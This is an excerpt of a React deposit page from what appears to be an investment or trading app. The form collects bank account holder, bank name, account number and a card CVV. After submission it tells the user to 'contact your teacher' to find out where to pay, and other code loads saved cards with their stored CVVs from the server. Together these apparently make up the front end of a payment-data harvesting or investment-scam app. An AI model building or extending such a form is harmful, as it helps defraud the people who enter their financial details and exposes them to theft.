...
export function DepositPage({ nav, onDeposit }) {
  ...
  const [bankAccount, setBankAccount] = useState({ holderName: "", bankName: "", accNumber: "", cvv: "" });
  ...
  if (showMessage) {
    return (
      <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: 30, textAlign: "center" }}>
        ...
        <div style={{ fontSize: 12, color: T.dim, marginBottom: 4 }}>Amount: <span style={{ color: T.gold, fontWeight: 700 }}>{usd(parseFloat(amt))}</span></div>
        <div style={{ fontSize: 13, color: T.acc, marginTop: 15, marginBottom: 20, padding: "15px", background: "rgba(0,229,176,0.1)", borderRadius: 12 }}>
          📢 Please contact your teacher. They will guide you on where to make the payment.
        </div>
        <PB lbl="Back to Home" onClick={() => { ss(1); sa(""); setBankAccount({ holderName: "", bankName: "", accNumber: "", cvv: "" }); setShowMessage(false); nav("home"); }} />
      </div>
    );
  }
      ...
      <div style={{ flex: 1, overflowY: "auto", paddingBottom: 20 }}>
        ...
        <div style={{ padding: "13px 13px 0" }}>
          <div style={{ background: "linear-gradient(135deg,#0c2340,#1a3a5c)", borderRadius: 16, padding: "17px 15px", marginBottom: 14, boxShadow: "0 5px 18px rgba(0,0,0,0.4)" }}>
            <div style={{ fontSize: 9, color: "rgba(255,255,255,0.45)", letterSpacing: 2, marginBottom: 7 }}>BANK ACCOUNT</div>
            <div style={{ fontSize: 17, fontWeight: 900, color: "#fff", marginBottom: 11 }}>{bankAccount.accNumber || "•••• •••• •••• ••••"}</div>
            <div style={{ display: "flex", justifyContent: "space-between" }}>
              <span style={{ fontSize: 11, color: "rgba(255,255,255,0.55)" }}>{bankAccount.holderName || "ACCOUNT HOLDER"}</span>
              <span style={{ fontSize: 11, color: "rgba(255,255,255,0.55)" }}>{bankAccount.bankName || "BANK NAME"}</span>
            </div>
          </div>
          <div style={{ background: T.card, borderRadius: 13, padding: "14px 13px", marginBottom: 11, border: `1px solid ${T.line}` }}>
            ...
            <Input label="ACCOUNT HOLDER NAME" val={bankAccount.holderName} set={(v) => setBankAccount((p) => ({ ...p, holderName: v.toUpperCase() }))} ph="Name on account" err={errs.holderName} />
            <Input label="BANK NAME" val={bankAccount.bankName} set={(v) => setBankAccount((p) => ({ ...p, bankName: v }))} ph="e.g., Chase Bank" err={errs.bankName} />
            <Input label="ACCOUNT NUMBER" val={bankAccount.accNumber} set={(v) => setBankAccount((p) => ({ ...p, accNumber: v.replace(/\s/g, "") }))} ph="Enter account number" err={errs.accNumber} />
            <Input label="CVV" type="text" val={bankAccount.cvv} set={(v) => setBankAccount((p) => ({ ...p, cvv: v }))} ph="Enter CVV" err={errs.cvv} />
          </div>
          <PB lbl="Confirm Payment" onClick={() => { handleDepositRequest(); }} />
        </div>
      </div>
    );

  return (
    <div style={{ flex: 1, overflowY: "auto", paddingBottom: 20, scrollbarWidth: "none", msOverflowStyle: "none" }}>
      ...
      <div style={{ padding: "13px 13px 0" }}>
        ...
        <PB lbl="Continue to Payment →" onClick={() => { if (amt && parseFloat(amt) > 0) ss(2); }} dis={!amt || parseFloat(amt) <= 0} />
      </div>
    </div>
  );
}
    ...
    try {
      ...
      if (!data.error) {
        ...
        const mappedCards = (data.savedCards || []).map(card => ({
          ...
          cvv: card.cvv || "",
          display: card.display || `${card.bankName || card.name || "Bank"} - ****${(card.accNumber || card.num || "").slice(-4)}`,
        }));
        sc(mappedCards);
      }
    } catch (err) {
